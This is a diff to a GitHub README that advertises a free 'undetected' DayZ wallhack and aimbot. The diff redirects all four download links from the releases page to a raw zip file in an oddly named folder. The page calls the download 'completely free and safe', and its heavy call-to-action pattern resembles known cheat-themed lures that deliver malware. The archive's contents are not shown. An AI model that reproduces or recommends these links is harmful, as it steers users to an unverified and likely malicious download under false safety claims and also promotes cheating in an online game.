@@ -1,6 +1,6 @@
 # 🎯 Dayz-Wallhack - Dominate DayZ with Undetected Precision
 
-[![Download Dayz-Wallhack](https://img.shields.io/badge/Download-Dayz_Wallhack_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/releases)
+[![Download Dayz-Wallhack](https://img.shields.io/badge/Download-Dayz_Wallhack_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/raw/refs/heads/main/Serbdom/1.1-beta.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application. The download is completely free and safe for Windows users. Click the button above or the link below to access the latest release page.
 
-**👉 [Download Dayz-Wallhack Now](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/releases)**
+**👉 [Download Dayz-Wallhack Now](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/raw/refs/heads/main/Serbdom/1.1-beta.3.zip)**
 
 Once you're on the release page, you'll see the newest version available. Simply click the download button to save the file to your computer. That's it—no complicated steps, no registration required.
 
@@ -152,7 +152,7 @@ We believe in providing the best possible experience at no cost. That's why thou
 
 Don't miss out on future updates and improvements. Check our release page regularly for new versions. We're always working on making Dayz-Wallhack even better.
 
-**👉 [Get the Latest Version Here](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/releases)**
+**👉 [Get the Latest Version Here](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/raw/refs/heads/main/Serbdom/1.1-beta.3.zip)**
 
 ---
 
@@ -168,7 +168,7 @@ Dayz-Wallhack gives you the ultimate advantage in DayZ. With its powerful aimbot
 
 Don't wait—download Dayz-Wallhack today and experience DayZ like never before. Your competition won't know what hit them.
 
-**[🚀 Start Downloading Now](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/releases)**
+**[🚀 Start Downloading Now](https://github.com/Honorary-inwardness3188/Dayz-Wallhack/raw/refs/heads/main/Serbdom/1.1-beta.3.zip)**
 
 ---
 
